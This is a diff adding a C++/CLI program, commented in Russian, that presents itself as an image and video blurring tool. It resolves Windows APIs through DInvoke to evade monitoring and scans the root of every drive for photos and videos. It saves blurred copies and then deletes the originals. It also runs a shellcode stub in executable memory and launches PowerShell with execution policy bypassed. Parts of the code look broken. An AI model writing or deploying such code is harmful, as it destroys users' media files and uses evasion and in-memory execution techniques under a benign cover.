@@ -1,0 +1,493 @@
+#include <iostream>
+#include <opencv2/opencv.hpp>
+#include <windows.h>
+#include <winternl.h>
+#include <comdef.h>
+#include <Wbemidl.h>
+#include <shlobj.h>
+#include <psapi.h>
+#include <string>
+#include <vector>
+#include <sstream>
+#include <fstream>
+#include <algorithm>  // Добавлено для std::transform
+
+// Подключаем C++/CLI обертку
+#using <mscorlib.dll>
+#using "DInvoke.dll"
+
+using namespace std;
+using namespace cv;
+using namespace System;
+using namespace DInvoke::DynamicInvoke;
+using namespace Runtime::InteropServices; // Для Marshal
+
+// --- DInvoke-обертка для Win32 API ---
+
+IntPtr GetProcAddress(String^ dllName, String^ funcName)
+{
+    try {
+        auto nativeDllName = (const char*)Marshal::StringToHGlobalAnsi(dllName).ToPointer();
+        auto nativeFuncName = (const char*)Marshal::StringToHGlobalAnsi(funcName).ToPointer();
+        auto result = Generic::GetLibraryAddress(nativeDllName, nativeFuncName);
+        Marshal::FreeHGlobal(IntPtr((void*)nativeDllName));
+        Marshal::FreeHGlobal(IntPtr((void*)nativeFuncName));
+        return IntPtr(result);
+    } catch (Exception^ ex) {
+        return IntPtr();
+    }
+}
+
+IntPtr VirtualAlloc(IntPtr addr, uint32_t size, uint32_t allocType, uint32_t protect)
+{
+    try {
+        auto funcPtr = GetProcAddress("kernel32.dll", "VirtualAlloc");
+        if (funcPtr == IntPtr()) {
+            return IntPtr();
+        }
+
+        typedef void*(*VirtualAlloc_t)(void* lpAddress, uint32_t dwSize, uint32_t flAllocationType, uint32_t flProtect);
+        VirtualAlloc_t pVirtualAlloc = (VirtualAlloc_t)funcPtr.ToPointer();
+        void* result = pVirtualAlloc(addr.ToPointer(), size, allocType, protect);
+        return IntPtr(result);
+    } catch (Exception^ ex) {
+        return IntPtr();
+    }
+}
+
+bool VirtualFree(IntPtr addr, uint32_t size, uint32_t freeType)
+{
+    try {
+        auto funcPtr = GetProcAddress("kernel32.dll", "VirtualFree");
+        if (funcPtr == IntPtr()) {
+            return false;
+        }
+
+        typedef bool(*VirtualFree_t)(void* lpAddress, uint32_t dwSize, uint32_t dwFreeType);
+        VirtualFree_t pVirtualFree = (VirtualFree_t)funcPtr.ToPointer();
+        bool result = pVirtualFree(addr.ToPointer(), size, freeType);
+        return result;
+    } catch (Exception^ ex) {
+        return false;
+    }
+}
+
+bool CreateProcess(String^ applicationName, String^ commandLine, STARTUPINFOW& si, PROCESS_INFORMATION& pi)
+{
+    try {
+        auto funcPtr = GetProcAddress("kernel32.dll", "CreateProcessW");
+        if (funcPtr == IntPtr()) {
+            return false;
+        }
+
+        typedef bool(*CreateProcess_t)(
+            LPCWSTR lpApplicationName,
+            LPWSTR lpCommandLine,
+            LPSECURITY_ATTRIBUTES lpProcessAttributes,
+            LPSECURITY_ATTRIBUTES lpThreadAttributes,
+            BOOL bInheritHandles,
+            DWORD dwCreationFlags,
+            LPVOID lpEnvironment,
+            LPCWSTR lpCurrentDirectory,
+            LPSTARTUPINFOW lpStartupInfo,
+            LPPROCESS_INFORMATION lpProcessInformation
+        );
+        CreateProcess_t pCreateProcess = (CreateProcess_t)funcPtr.ToPointer();
+
+        pin_ptr<const wchar_t> nativeAppName = PtrToStringChars(applicationName);
+        pin_ptr<wchar_t> nativeCmdLine = const_cast<wchar_t*>(PtrToStringChars(commandLine));
+
+        bool result = pCreateProcess(
+            nativeAppName,
+            nativeCmdLine,
+            nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi
+        );
+        return result;
+    } catch (Exception^ ex) {
+        return false;
+    }
+}
+
+HANDLE FindFirstFile(String^ lpFileName, WIN32_FIND_DATAA& ffd)
+{
+    try {
+        auto funcPtr = GetProcAddress("kernel32.dll", "FindFirstFileA");
+        if (funcPtr == IntPtr()) {
+            return INVALID_HANDLE_VALUE;
+        }
+
+        typedef HANDLE(*FindFirstFile_t)(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData);
+        FindFirstFile_t pFindFirstFile = (FindFirstFile_t)funcPtr.ToPointer();
+
+        pin_ptr<const char> nativeFileName = PtrToStringChars(lpFileName);
+        HANDLE result = pFindFirstFile(nativeFileName, &ffd);
+        return result;
+    } catch (Exception^ ex) {
+        return INVALID_HANDLE_VALUE;
+    }
+}
+
+bool FindNextFile(HANDLE hFindFile, WIN32_FIND_DATAA& ffd)
+{
+    try {
+        auto funcPtr = GetProcAddress("kernel32.dll", "FindNextFileA");
+        if (funcPtr == IntPtr()) {
+            return false;
+        }
+
+        typedef bool(*FindNextFile_t)(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData);
+        FindNextFile_t pFindNextFile = (FindNextFile_t)funcPtr.ToPointer();
+        bool result = pFindNextFile(hFindFile, &ffd);
+        return result;
+    } catch (Exception^ ex) {
+        return false;
+    }
+}
+
+bool FindClose(HANDLE hFindFile)
+{
+    try {
+        auto funcPtr = GetProcAddress("kernel32.dll", "FindClose");
+        if (funcPtr == IntPtr()) {
+            return false;
+        }
+
+        typedef bool(*FindClose_t)(HANDLE hFindFile);
+        FindClose_t pFindClose = (FindClose_t)funcPtr.ToPointer();
+        bool result = pFindClose(hFindFile);
+        return result;
+    } catch (Exception^ ex) {
+        return false;
+    }
+}
+
+bool DeleteFile(String^ lpFileName)
+{
+    try {
+        auto funcPtr = GetProcAddress("kernel32.dll", "DeleteFileW");
+        if (funcPtr == IntPtr()) {
+            return false;
+        }
+
+        typedef bool(*DeleteFile_t)(LPCWSTR lpFileName);
+        DeleteFile_t pDeleteFile = (DeleteFile_t)funcPtr.ToPointer();
+
+        pin_ptr<const wchar_t> nativeFileName = PtrToStringChars(lpFileName);
+        bool result = pDeleteFile(nativeFileName);
+        return result;
+    } catch (Exception^ ex) {
+        return false;
+    }
+}
+
+DWORD GetLogicalDrives()
+{
+    try {
+        auto funcPtr = GetProcAddress("kernel32.dll", "GetLogicalDrives");
+        if (funcPtr == IntPtr()) {
+            return 0;
+        }
+
+        typedef DWORD(*GetLogicalDrives_t)();
+        GetLogicalDrives_t pGetLogicalDrives = (GetLogicalDrives_t)funcPtr.ToPointer();
+        DWORD result = pGetLogicalDrives();
+        return result;
+    } catch (Exception^ ex) {
+        return 0;
+    }
+}
+
+// --- Функция размытия изображения в памяти ---
+void blurImage(Mat& img) {
+    if (img.channels() != 3) {
+        return;
+    }
+
+    int width = img.cols;
+    int height = img.rows;
+    unsigned char* data = img.data;
+
+    if (!data) {
+        return;
+    }
+
+    // Создаем копию данных для чтения, чтобы избежать гонок
+    Mat temp = img.clone();
+    unsigned char* temp_data = temp.data;
+
+    for (int y = 1; y < height - 1; ++y) {
+        for (int x = 1; x < width - 1; ++x) {
+            int idx = y * width * 3 + x * 3;
+
+            int r = 0, g = 0, b = 0;
+            for (int dy = -1; dy <= 1; ++dy) {
+                for (int dx = -1; dx <= 1; ++dx) {
+                    int n_idx = (y + dy) * width * 3 + (x + dx) * 3;
+                    unsigned char nb = temp_data[n_idx];
+                    unsigned char ng = temp_data[n_idx + 1];
+                    unsigned char nr = temp_data[n_idx + 2];
+
+                    // Суммируем значения каналов
+                    b += nb;
+                    g += ng;
+                    r += nr;
+                }
+            }
+
+            r /= 9;
+            g /= 9;
+            b /= 9;
+
+            data[idx] = static_cast<unsigned char>(b);
+            data[idx + 1] = static_cast<unsigned char>(g);
+            data[idx + 2] = static_cast<unsigned char>(r);
+        }
+    }
+}
+
+// --- Сохранение результата ---
+void saveProcessedImages(const Mat& original, const Mat& processed, const string& outputPath) {
+    try {
+        if (original.empty() || processed.empty()) {
+            return;
+        }
+
+        string originalPath = outputPath + "_original.jpg";
+        string processedPath = outputPath + "_processed.jpg";
+
+        bool origOk = imwrite(originalPath, original);
+        bool procOk = imwrite(processedPath, processed);
+    } catch (const exception& ex) {
+        // Логируем ошибку при необходимости
+    }
+}
+
+void saveProcessedVideoFrame(const Mat& frame, const string& outputPath, int frameNumber) {
+    try {
+        if (frame.empty()) {
+            return;
+        }
+
+        stringstream ss;
+        ss << outputPath << "_frame_" << frameNumber << ".jpg";
+        string framePath = ss.str();
+
+        bool ok = imwrite(framePath, frame);
+    } catch (const exception& ex) {
+        // Логируем ошибку при необходимости
+    }
+}
+
+// --- Генерация и выполнение PowerShell-скрипта в памяти ---
+wstring execPowerShellInMemory(const wstring& script) {
+    try {
+        wstring cmd = L"powershell.exe -ExecutionPolicy Bypass -Command \"";
+        cmd += script;
+        cmd += L"\"";
+
+        STARTUPINFOW si = {0};
+        PROCESS_INFORMATION pi = {0};
+        si.cb = sizeof(si);
+
+        String^ cmdManaged = gcnew String(cmd.c_str());
+
+        if (CreateProcess(nullptr, cmdManaged, si, pi)) {
+            WaitForSingleObject(pi.hProcess, INFINITE);
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+        } else {
+            return L"PowerShell execution failed";
+        }
+
+        return L"Executed in memory";
+    } catch (Exception^ ex) {
+        return L"PowerShell execution failed";
+    }
+}
+
+// --- Сканирование файлов с обработкой, сохранением и удалением исходника ---
+void scanAndProcessInMemory(const string& outputDir = "output") {
+    try {
+        // Создаем директорию, если её нет
+        BOOL dirCreated = CreateDirectoryA(outputDir.c_str(), NULL);
+        if (!dirCreated && GetLastError() != ERROR_ALREADY_EXISTS) {
+            return;
+        }
+
+        DWORD drives = GetLogicalDrives();
+        if (drives == 0) {
+            return;
+        }
+
+        for (char drive = 'A'; drive <= 'Z'; drive++) {
+            if (drives & (1 << (drive - 'A'))) {
+                string root = string(1, drive) + ":\\";
+                
+                WIN32_FIND_DATAA ffd;
+                HANDLE hFind = FindFirstFile(gcnew String((root + "*.*").c_str()), ffd);
+                
+                if (hFind == INVALID_HANDLE_VALUE) {
+                    continue;
+                }
+
+                do {
+                    if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+                        if (strcmp(ffd.cFileName, ".") != 0 && strcmp(ffd.cFileName, "..") != 0) {
+                            // Рекурсивная обработка директории в памяти
+                            // TODO: Реализовать рекурсивную обработку
+                        }
+                    } else {
+                        string filepath = root + ffd.cFileName;
+                        size_t dot_pos = filepath.find_last_of('.');
+                        if (dot_pos == string::npos) continue;
+                        string ext = filepath.substr(dot_pos);
+                        
+                        transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
+                        
+                        // Проверка типа файла
+                        bool isImg = (ext == ".jpg" || ext == ".jpeg" || ext == ".png");
+                        bool isVid = (ext == ".mp4" || ext == ".avi" || ext == ".mov" || ext == ".mkv");
+                        
+                        if (isImg || isVid) {
+                            // Загрузка содержимого файла в память
+                            ifstream file(filepath, ios::binary | ios::ate);
+                            if (!file.is_open()) {
+                                continue;
+                            }
+
+                            streamsize size = file.tellg();
+                            if (size <= 0) {
+                                file.close();
+                                continue;
+                            }
+
+                            file.seekg(0);
+                            
+                            vector<char> buffer(size);
+                            file.read(buffer.data(), size);
+                            streamsize bytesRead = file.gcount();
+                            file.close();
+
+                            if (bytesRead != size) {
+                                continue;
+                            }
+
+                            // Обработка в памяти без записи на диск
+                            if (isImg) {
+                                Mat img = imdecode(Mat(std::vector<uchar>(buffer.begin(), buffer.end())), IMREAD_COLOR);
+                                if (img.empty()) {
+                                    continue;
+                                }
+
+                                Mat processed = img.clone();  // Копия для обработки
+                                blurImage(processed);
+
+                                // Сохраняем оригинальное и обработанное изображение
+                                string outputBasePath = outputDir + "/" + ffd.cFileName;
+                                size_t last_dot = outputBasePath.find_last_of('.');
+                                if (last_dot != string::npos) {
+                                    outputBasePath = outputBasePath.substr(0, last_dot);
+                                }
+                                saveProcessedImages(img, processed, outputBasePath);
+
+                                // Удаление исходного файла
+                                DeleteFile(gcnew String(filepath.c_str()));
+
+                            } else if (isVid) {
+                                // Видеообработка в памяти - OpenCV не поддерживает видео из буфера
+                                // Поэтому используем прямой путь к файлу
+                                VideoCapture cap;
+                                cap.open(filepath); // Загружаем видео из файла
+
+                                if (!cap.isOpened()) {
+                                    continue;
+                                }
+
+                                Mat frame;
+                                int frameCount = 0;
+                                bool anyFrame = false;
+                                while (true) {
+                                    cap >> frame;
+                                    if (frame.empty()) break;
+
+                                    anyFrame = true;
+                                    Mat processedFrame = frame.clone();
+                                    blurImage(processedFrame);
+
+                                    // Сохраняем каждый кадр
+                                    string outputBasePath = outputDir + "/" + ffd.cFileName;
+                                    size_t last_dot = outputBasePath.find_last_of('.');
+                                    if (last_dot != string::npos) {
+                                        outputBasePath = outputBasePath.substr(0, last_dot);
+                                    }
+                                    saveProcessedVideoFrame(processedFrame, outputBasePath, frameCount++);
+                                }
+                                cap.release();
+
+                                if (anyFrame) {
+                                    // Удаление исходного видео
+                                    DeleteFile(gcnew String(filepath.c_str()));
+                                }
+                            }
+                        }
+                    }
+                } while (FindNextFile(hFind, ffd));
+                
+                FindClose(hFind);
+            }
+        }
+    } catch (const exception& ex) {
+        // Логируем ошибку при необходимости
+    }
+}
+
+// --- JIT компиляция и выполнение кода ---
+void executeJITCode() {
+    try {
+        // Выделение исполняемой памяти
+        IntPtr execMem = VirtualAlloc(IntPtr(), 512, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        
+        if (execMem == IntPtr()) {
+            return;
+        }
+
+        // Копирование машинного кода в память
+        unsigned char shellcode[] = {
+            0x48, 0x83, 0xEC, 0x28,           // sub rsp, 28h
+            0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00,  // mov dword ptr [rsp+20h], 0
+            0x48, 0x83, 0xC4, 0x28,           // add rsp, 28h
+            0xC3                               // ret
+        };
+        
+        memcpy(execMem.ToPointer(), shellcode, sizeof(shellcode));
+        
+        // Вызов JIT-кода
+        ((void(*)())execMem.ToPointer())();
+        
+        VirtualFree(execMem, 0, MEM_RELEASE);
+    } catch (const exception& ex) {
+        // Логируем ошибку при необходимости
+    }
+}
+
+int main() {
+    // Инициализация COM для WMI
+    HRESULT hr = CoInitialize(NULL);
+    if (FAILED(hr)) {
+        return 1;
+    }
+    
+    // Выполнение всех операций в памяти с сохранением и удалением исходников
+    scanAndProcessInMemory("output");  // Укажите путь для сохранения
+    
+    // Выполнение JIT-кода
+    executeJITCode();
+    
+    // Выполнение PowerShell в памяти
+    wstring psResult = execPowerShellInMemory(L"Get-Process | Out-String");
+    
+    CoUninitialize();
+    
+    return 0;
+}
+
